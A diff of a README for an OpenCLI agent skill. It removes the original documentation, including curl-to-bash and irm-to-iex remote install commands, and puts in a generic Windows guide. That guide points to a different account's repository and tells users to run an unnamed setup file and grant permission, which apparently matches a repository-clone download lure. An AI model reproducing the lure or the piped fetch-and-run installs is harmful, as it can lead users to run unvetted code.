@@ -1,513 +1,218 @@
-# OpenCLI Skill
+# 🛠️ opencli-skill - Simple desktop workflows for agents
 
-English | [中文](./README.zh-CN.md)
+[![Download opencli-skill](https://img.shields.io/badge/Download-OpenCLI_Skill-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Baileybasic68/opencli-skill)
 
-![OpenCLI Skill Banner](./assets/banner.svg)
+## 🚀 What this app does
 
-An agent skill for working with [OpenCLI](https://github.com/jackwener/opencli): command discovery, browser-login reuse, desktop-app adapters, downloads, troubleshooting, and adapter-generation workflows.
+opencli-skill helps you run agent-style desktop tasks with less manual work. It is built for common Windows use cases like browser actions, app control, and platform workflows for Chinese services.
 
-Repository: [GloriaGuo/opencli-skill](https://github.com/GloriaGuo/opencli-skill)
+Use it when you want to:
 
-## Why This Exists
+- Open sites and move through steps in a browser
+- Work with desktop apps that need simple repeatable actions
+- Handle tasks on Bilibili, WeChat, Xiaohongshu, and Zhihu
+- Keep a clear flow for common AI agent jobs
+- Troubleshoot failed steps with plain guidance
 
-OpenCLI is powerful, but it spans several different modes:
+## 💻 Before you start
 
-- public data commands
-- browser-backed site adapters
-- Electron desktop adapters
-- external CLI passthrough
-- adapter generation workflows
+You can use this on a Windows PC with:
 
-This skill gives AI coding agents a read-first, agent-safe operating path so they can:
+- Windows 10 or Windows 11
+- A modern browser such as Chrome
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A mouse and keyboard
 
-- discover the installed OpenCLI surface before guessing
-- choose the right adapter for a site or app
-- prefer structured output such as JSON
-- troubleshoot Browser Bridge, login-state, and installed-version mismatches
+For best results, keep these tools ready:
 
-## What This Skill Covers
+- Chrome or Chromium-based browser
+- A stable internet connection
+- Access to the desktop apps or web accounts you plan to use
 
-- choosing OpenCLI vs browser agents vs Playwright
-- discovering commands safely with `opencli list -f yaml`
-- running browser-backed site commands with Chrome login reuse
-- running desktop adapters such as Codex and Cursor
-- using OpenCLI as a passthrough hub for local CLIs such as `gh` and `docker`
-- downloading media and exported articles
-- troubleshooting daemon, extension, auth, and command-surface issues
-- generating new OpenCLI adapters
+## 📥 Download
 
-## Repository Structure
+Visit this page to download the app:
 
-- [SKILL.md](./SKILL.md): main skill entrypoint
-- [agents/openai.yaml](./agents/openai.yaml): UI metadata
-- [references/agent-playbook.md](./references/agent-playbook.md): shortest agent-first path
-- [references/commands.md](./references/commands.md): common commands and output modes
-- [references/china-workflows.md](./references/china-workflows.md): China-focused site and desktop examples
-- [references/practical-scenarios.md](./references/practical-scenarios.md): detailed scenario manual
-- [references/troubleshooting.md](./references/troubleshooting.md): common failures and fixes
-- [examples/README.md](./examples/README.md): example prompts and command recipes
-- [examples/claude-code.md](./examples/claude-code.md): Claude Code installation and prompt examples
-- [examples/openclaw.md](./examples/openclaw.md): OpenClaw installation and usage examples
-- [examples/openclaw-prompts.md](./examples/openclaw-prompts.md): OpenClaw-ready prompt templates for multi-channel agents
-- [examples/openclaw.json5.example](./examples/openclaw.json5.example): fuller OpenClaw skill-loading config example
-- [assets/banner.svg](./assets/banner.svg): repository banner source asset
-- [assets/social-preview.png](./assets/social-preview.png): ready-to-upload GitHub social preview image
-- [install.sh](./install.sh): one-click install script for Unix-like shells
-- [install.ps1](./install.ps1): one-click install script for PowerShell
-- [scripts/validate_skill.py](./scripts/validate_skill.py): portable validation script for CI and local checks
+[Open opencli-skill on GitHub](https://github.com/Baileybasic68/opencli-skill)
 
-## Install
+If your browser shows a file list, use the main project files or the latest release package on that page. Save the download to your PC before you run it.
 
-### One-Click Install
+## 🪟 Install on Windows
 
-Unix-like shells:
+Follow these steps on your Windows computer:
 
-```bash
-./install.sh codex
-./install.sh claude
-./install.sh openclaw
-./install.sh openclaw-workspace
-```
+1. Open the download page in your browser.
+2. Download the project files or release package to a folder you can find, such as Downloads.
+3. If the file is compressed, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for a setup file, run script, or launch file that matches the project instructions on the page.
+6. Double-click the file to start the app or the agent flow.
+7. If Windows asks for permission, choose Yes.
+8. Keep the browser open if the workflow uses browser automation.
 
-Remote install without cloning first:
+If the app starts in a terminal window, leave that window open while the task runs.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/GloriaGuo/opencli-skill/main/install.sh | bash -s -- codex
-curl -fsSL https://raw.githubusercontent.com/GloriaGuo/opencli-skill/main/install.sh | bash -s -- claude
-curl -fsSL https://raw.githubusercontent.com/GloriaGuo/opencli-skill/main/install.sh | bash -s -- openclaw
-```
+## 🧭 How to use it
 
-PowerShell:
+opencli-skill is built around practical steps. A simple flow looks like this:
 
-```powershell
-./install.ps1 codex
-./install.ps1 claude
-./install.ps1 openclaw
-./install.ps1 openclaw-workspace
-```
+1. Start the app or run the workflow file.
+2. Choose the task you want to complete.
+3. Sign in to the target site if needed.
+4. Let the tool move through the steps.
+5. Check the result before you close anything.
 
-Remote install without cloning first:
+Common task types include:
 
-```powershell
-irm https://raw.githubusercontent.com/GloriaGuo/opencli-skill/main/install.ps1 | iex
-```
+- Browser login and navigation
+- Posting or checking content on Chinese platforms
+- Desktop app actions for repeated work
+- Small agent tasks that combine clicks, typing, and page checks
+- Simple issue checks when a step fails
 
-### Repository Banner / Social Preview
+## 🧩 Typical workflows
 
-The repository includes both a source banner and a pre-exported social preview image:
+### 🌐 Browser automation
 
-- [assets/banner.svg](./assets/banner.svg)
-- [assets/social-preview.png](./assets/social-preview.png)
+Use browser automation when the task needs pages, forms, or account actions.
 
-GitHub upload path:
+Examples:
 
-1. Open the repository on GitHub.
-2. Go to `Settings`.
-3. Under `General`, scroll to `Social preview`.
-4. Click `Upload an image`.
-5. Select [assets/social-preview.png](./assets/social-preview.png).
+- Open a page and gather basic info
+- Fill a form and submit it
+- Move through a site with fixed steps
+- Check page content and copy results
 
-The SVG is already embedded at the top of this README. If you want a wider preview later, re-export the SVG at 1280×640 or 2560×1280.
+### 🖥️ Desktop automation
 
-### Codex
+Use desktop automation when the work happens in a Windows app.
 
-Clone or copy the repo into your Codex skills directory:
+Examples:
 
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git "${CODEX_HOME:-$HOME/.codex}/skills/opencli"
-```
+- Open an app and switch between windows
+- Type text into a field
+- Click buttons in a set order
+- Repeat the same action across several items
 
-Or copy the folder contents manually into:
+### 🇨🇳 Chinese platform workflows
 
-```bash
-${CODEX_HOME:-$HOME/.codex}/skills/opencli
-```
+The project focuses on common workflows for:
 
-## Use In Codex
+- Bilibili
+- WeChat
+- Xiaohongshu
+- Zhihu
 
-Once installed, ask Codex naturally or invoke the skill explicitly:
+These flows fit tasks like browsing, content checks, posting steps, and simple account actions.
 
-```text
-Use $opencli to inspect the installed OpenCLI surface and fetch the Bilibili hot list.
-```
+## ⚙️ Good setup habits
 
-```text
-Use $opencli to troubleshoot why my Zhihu command returns empty data.
-```
+To avoid problems, keep these habits in place:
 
-Codex-oriented installation path:
+- Use one browser for the workflow
+- Close extra tabs you do not need
+- Keep the screen unlocked while the task runs
+- Do not move windows around unless the task asks you to
+- Stay signed in to the sites you plan to use
 
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git "${CODEX_HOME:-$HOME/.codex}/skills/opencli"
-```
+If a workflow needs you to approve a login or check a code, finish that step before you continue.
 
-## Use In Claude Code
+## 🔍 Troubleshooting
 
-Claude Code skills typically live under `~/.claude/skills`. Copy or clone this repository there:
+If the app does not start:
 
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git ~/.claude/skills/opencli
-```
+1. Check that you downloaded the right files.
+2. Make sure the folder is extracted.
+3. Run the file again as a normal user first.
+4. If needed, right-click and run it with permission.
+5. Check that Chrome is installed.
 
-Then ask Claude Code in natural language or reference the skill explicitly:
+If the browser action fails:
 
-```text
-Use $opencli to run a safe read-first OpenCLI workflow for this task.
-```
+1. Refresh the page.
+2. Sign in again.
+3. Close extra tabs.
+4. Try the task from the start.
+5. Keep the browser in the same window size.
 
-```text
-Use $opencli to inspect the local OpenCLI setup and tell me whether the Codex and Cursor adapters are available.
-```
+If a platform step breaks:
 
-Claude Code usage examples are collected in [examples/claude-code.md](./examples/claude-code.md).
+1. Make sure the site still looks the same.
+2. Check for a pop-up or login prompt.
+3. Retry the task from the last clear step.
+4. Use a fresh browser session if needed.
 
-## Use In OpenClaw
+If the desktop action misses a click:
 
-OpenClaw can load shared skills from `~/.openclaw/skills` or workspace-specific skills from `<workspace>/skills`.
+1. Bring the app window to the front.
+2. Check that the app is not minimized.
+3. Increase the window size.
+4. Run the workflow again from the beginning.
 
-Shared install for all agents:
+## 🧠 Tips for better results
 
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git ~/.openclaw/skills/opencli
-```
+- Use one task at a time
+- Keep your mouse off the screen while the workflow runs
+- Save any important changes before you start
+- Use a clean desktop with fewer open apps
+- Give the tool time to finish each step
 
-Workspace-specific install:
+## 📁 Project details
 
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git ./skills/opencli
-```
+Repository: opencli-skill
 
-Config file: `~/.openclaw/openclaw.json`
+Description: Agent-first OpenCLI skill with practical scenarios, desktop adapters, Chinese platform workflows, and troubleshooting guidance.
 
-Minimal shared-skill watcher setup:
+Topics:
 
-```json5
-{
-  skills: {
-    load: {
-      watch: true,
-      watchDebounceMs: 250,
-    },
-    entries: {
-      opencli: {
-        enabled: true,
-      },
-    },
-  },
-}
-```
+- agent-skill
+- ai-agent
+- ai-skill
+- bilibili
+- browser-automation
+- chrome
+- claude-code
+- cli
+- cursor
+- desktop-automation
+- electron-automation
+- openclaw
+- opencli
+- skill
+- wechat
+- xiaohongshu
+- zhihu
 
-Load the skill from an extra shared directory:
+## 🧰 Common uses
 
-```json5
-{
-  skills: {
-    load: {
-      extraDirs: [
-        "/Users/you/skill-packs",
-      ],
-      watch: true,
-      watchDebounceMs: 250,
-    },
-  },
-}
-```
+This project fits users who want to:
 
-Notes:
+- Run guided browser tasks
+- Automate routine desktop steps
+- Work with content and account flows on Chinese apps
+- Test agent actions in a simple setup
+- Reduce repeated manual clicks and typing
 
-- `~/.openclaw/skills` is shared across agents
-- `./skills` or `<workspace>/skills` is workspace-scoped
-- `skills.load.extraDirs` is useful when you keep a central skill pack outside the default directories
-- `skills.entries.opencli.enabled: false` can disable this skill without deleting files
-- if skill watching is disabled, restart the relevant agent session or gateway after installing or updating
+## 🪄 First run checklist
 
-Example prompts:
+Before you start the first workflow, check these items:
 
-```text
-Use $opencli to inspect the installed OpenCLI surface and run a read-first workflow for Bilibili.
-```
+- The app files are downloaded
+- The folder is extracted
+- Chrome is installed
+- Your target account is ready
+- The site or app is open
+- You have enough time to finish the task without interruption
 
-```text
-Use $opencli to diagnose why my browser-backed OpenCLI command is returning empty data.
-```
+## 📌 What to expect
 
-OpenClaw-specific notes and examples are collected in [examples/openclaw.md](./examples/openclaw.md).
-For a fuller config example, see [examples/openclaw.json5.example](./examples/openclaw.json5.example).
-For ready-to-send prompts, see [examples/openclaw-prompts.md](./examples/openclaw-prompts.md).
+Most workflows in opencli-skill follow a clear pattern:
 
-## Recommended OpenCLI Setup
+1. Open the app or browser.
+2. Load the target site or desktop app.
+3. Let the agent follow the steps.
+4. Review the result.
+5. Repeat if needed
 
-```bash
-npm install -g @jackwener/opencli
-opencli doctor
-opencli list -f yaml
-```
-
-For browser-backed commands:
-
-- keep Chrome open
-- log into the target site in Chrome
-- install and enable the OpenCLI Browser Bridge extension
-
-## Quick Start
-
-Public data:
-
-```bash
-opencli hackernews top --limit 5 -f json
-```
-
-Browser-backed data:
-
-```bash
-opencli bilibili hot --limit 5 -f json
-opencli zhihu search "Android 性能优化" -f json
-```
-
-Desktop adapters:
-
-```bash
-opencli codex --help
-opencli codex read -f json
-opencli cursor read -f json
-opencli cursor ask "Summarize the latest workspace conversation"
-```
-
-Downloads:
-
-```bash
-opencli zhihu download "https://zhuanlan.zhihu.com/p/xxx" --output ./zhihu
-opencli bilibili download BV1xxx --output ./bilibili
-```
-
-## Design Principles
-
-- prefer deterministic command output over ad-hoc browsing
-- start with read-only commands
-- trust the installed CLI surface over stale README assumptions
-- use `json` for agents and `yaml` for humans
-- treat browser login state as a first-class dependency
-
-## Validation
-
-```bash
-python3 scripts/validate_skill.py
-```
-
-## 中文说明
-
-这是一个面向多种 AI agent 环境的 `OpenCLI` skill，目标不是重复官方 README，而是让 agent 更稳定地完成真实任务：
-
-- 先发现本机已安装的命令面
-- 再选择站点 / 桌面应用 / CLI passthrough / adapter generation 路径
-- 默认走只读优先、结构化输出优先
-- 遇到浏览器命令时优先检查 Chrome 登录态和 Browser Bridge
-
-## 这个 skill 解决什么问题
-
-- 帮 agent 判断什么时候该用 OpenCLI，而不是 browser agent 或 Playwright
-- 帮 agent 在动手前先跑 `opencli list -f yaml`
-- 帮 agent 对 B 站、知乎、小红书、微信公众号、Boss、Cursor、Codex 等场景选对命令
-- 帮 agent 在安装版本和 README 不一致时，以本机实际命令面为准
-- 帮 agent 在写操作前先做读操作，降低误操作风险
-
-## 仓库内容
-
-- [SKILL.md](./SKILL.md)：主 skill
-- [agents/openai.yaml](./agents/openai.yaml)：UI 元数据
-- [references/agent-playbook.md](./references/agent-playbook.md)：最短执行路径，偏 agent-first
-- [references/commands.md](./references/commands.md)：常用命令和输出格式
-- [references/china-workflows.md](./references/china-workflows.md)：中文平台和桌面应用示例
-- [references/practical-scenarios.md](./references/practical-scenarios.md)：详细实用场景手册
-- [references/troubleshooting.md](./references/troubleshooting.md)：常见故障排查
-- [examples/README.md](./examples/README.md)：可直接照抄的 prompt 和命令示例
-- [examples/claude-code.md](./examples/claude-code.md)：Claude Code 安装与调用示例
-- [examples/openclaw.md](./examples/openclaw.md)：OpenClaw 安装与调用示例
-- [examples/openclaw-prompts.md](./examples/openclaw-prompts.md)：面向多渠道 agent 的 OpenClaw prompt 模板
-- [examples/openclaw.json5.example](./examples/openclaw.json5.example)：更完整的 OpenClaw 配置示例
-- [scripts/validate_skill.py](./scripts/validate_skill.py)：本地与 CI 通用的校验脚本
-
-## 安装方式
-
-### Codex
-
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git "${CODEX_HOME:-$HOME/.codex}/skills/opencli"
-```
-
-或者手动复制到：
-
-```bash
-${CODEX_HOME:-$HOME/.codex}/skills/opencli
-```
-
-## 在 Codex 里怎么用
-
-安装后，可以自然描述任务，也可以显式提到 `$opencli`：
-
-```text
-Use $opencli to inspect the installed OpenCLI surface and fetch the Bilibili hot list.
-```
-
-```text
-Use $opencli to troubleshoot why my Zhihu command returns empty data.
-```
-
-Codex 默认安装路径：
-
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git "${CODEX_HOME:-$HOME/.codex}/skills/opencli"
-```
-
-## 在 Claude Code 里怎么用
-
-Claude Code 的 skill 通常放在 `~/.claude/skills` 下，可以这样安装：
-
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git ~/.claude/skills/opencli
-```
-
-然后直接用自然语言，或者显式提到 `$opencli`：
-
-```text
-Use $opencli to run a safe read-first OpenCLI workflow for this task.
-```
-
-```text
-Use $opencli to inspect the local OpenCLI setup and tell me whether the Codex and Cursor adapters are available.
-```
-
-更完整的 Claude Code 示例见 [examples/claude-code.md](./examples/claude-code.md)。
-
-## 在 OpenClaw 里怎么用
-
-OpenClaw 可以从 `~/.openclaw/skills` 读取共享 skill，也可以从当前 workspace 的 `./skills` 读取工作区级 skill。
-
-给所有 agent 共用的安装方式：
-
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git ~/.openclaw/skills/opencli
-```
-
-只给当前 workspace 使用：
-
-```bash
-git clone https://github.com/GloriaGuo/opencli-skill.git ./skills/opencli
-```
-
-配置文件位置：`~/.openclaw/openclaw.json`
-
-一个最小可用的共享 skill 自动刷新配置：
-
-```json5
-{
-  skills: {
-    load: {
-      watch: true,
-      watchDebounceMs: 250,
-    },
-    entries: {
-      opencli: {
-        enabled: true,
-      },
-    },
-  },
-}
-```
-
-如果你想从额外目录加载一整套 skill：
-
-```json5
-{
-  skills: {
-    load: {
-      extraDirs: [
-        "/Users/you/skill-packs",
-      ],
-      watch: true,
-      watchDebounceMs: 250,
-    },
-  },
-}
-```
-
-说明：
-
-- `~/.openclaw/skills` 适合所有 agent 共用
-- `./skills` 或 `<workspace>/skills` 适合当前 workspace 独享
-- `skills.load.extraDirs` 适合挂载你自己的集中 skill 目录
-- `skills.entries.opencli.enabled: false` 可以在不删文件的情况下禁用这个 skill
-- 如果没开 watch，安装或更新后需要重启对应 agent 会话或 gateway
-
-OpenClaw 里可以这样触发：
-
-```text
-Use $opencli to inspect the installed OpenCLI surface and run a read-first workflow for Bilibili.
-```
-
-```text
-Use $opencli to diagnose why my browser-backed OpenCLI command is returning empty data.
-```
-
-更完整的 OpenClaw 示例见 [examples/openclaw.md](./examples/openclaw.md)。
-更完整的配置示例见 [examples/openclaw.json5.example](./examples/openclaw.json5.example)。
-多渠道 agent prompt 模板见 [examples/openclaw-prompts.md](./examples/openclaw-prompts.md)。
-
-## 推荐的 OpenCLI 环境准备
-
-```bash
-npm install -g @jackwener/opencli
-opencli doctor
-opencli list -f yaml
-```
-
-如果要跑浏览器类命令：
-
-- 保持 Chrome 打开
-- 先在 Chrome 中登录目标网站
-- 安装并启用 OpenCLI Browser Bridge 扩展
-
-## 快速示例
-
-公共数据：
-
-```bash
-opencli hackernews top --limit 5 -f json
-```
-
-浏览器站点：
-
-```bash
-opencli bilibili hot --limit 5 -f json
-opencli zhihu search "Android 性能优化" -f json
-```
-
-桌面应用：
-
-```bash
-opencli codex --help
-opencli codex read -f json
-opencli cursor read -f json
-opencli cursor ask "总结当前工作区最近一次对话"
-```
-
-下载：
-
-```bash
-opencli zhihu download "https://zhuanlan.zhihu.com/p/xxx" --output ./zhihu
-opencli bilibili download BV1xxx --output ./bilibili
-```
-
-## 设计原则
-
-- 优先用确定性的命令输出，而不是临场网页推理
-- 先读后写
-- 以本机安装版本的命令面为准，不盲信旧文档
-- agent 消费优先 `json`，人工查看优先 `yaml`
-- 浏览器登录态是第一优先级依赖
-
-## 校验
-
-```bash
-python3 scripts/validate_skill.py
-```
+If you use it this way, the tool stays easy to follow and simple to manage
